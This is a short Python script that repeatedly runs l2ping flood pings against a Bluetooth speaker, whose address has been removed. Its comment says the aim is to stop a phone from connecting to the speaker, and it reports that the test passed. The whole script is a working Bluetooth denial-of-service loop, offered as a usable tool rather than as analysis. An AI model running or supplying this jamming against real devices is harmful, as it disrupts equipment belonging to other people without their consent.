#testing spamming bluetooth speaker before phone has made a connection to prevent the phone from making a connection
#test: passed
import subprocess
import time

#Mac address removed for privacy and security reasons
cmd =['l2ping', '-i', 'hci0', '-s', '100', '-f', '-c', '1', ''] #speaker
    
while True:
    subprocess.call(cmd)
    time.sleep(.1)